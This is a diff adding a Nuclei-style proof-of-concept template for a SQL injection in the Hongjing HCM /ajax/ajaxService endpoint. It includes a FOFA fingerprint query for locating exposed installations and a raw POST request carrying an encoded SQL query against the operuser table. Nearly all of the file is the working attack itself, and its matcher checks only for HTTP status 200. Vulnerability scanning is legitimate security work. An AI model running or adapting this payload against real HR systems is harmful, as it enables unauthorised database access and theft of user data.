@@ -1,0 +1,45 @@
+id: poc-gigxxxgawn136giz
+info:
+  name: 宏景HCM-SQL注入-ajaxService
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gigxxxgawn136giz'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gigxxxgawn136giz
+    fofa: icon_hash="947874108" || body='<div class="hj-hy-all-one-logo"' || app="HJSOFT-HCM"
+http:
+- raw:
+  - 'POST /ajax/ajaxService HTTP/1.1
+
+
+    Cookie: JSESSIONID=8A569640D4EE7D518A536CC263DCBBB3
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    __type=extTrans&__xml={"functionId":"151211001137","sql":"select~20111*111~20a~30~31~30~30~2c~31~20a~30~31~30~31~2c~31~20b~30~31~31~30~2c~31~20e~30~31~32~32~2c~31~20e~30~31a~31~2c~31~20dbase~2c~31~20a~30~30~30~30~20from~20operuser","nbase":"1"}
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    12321
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
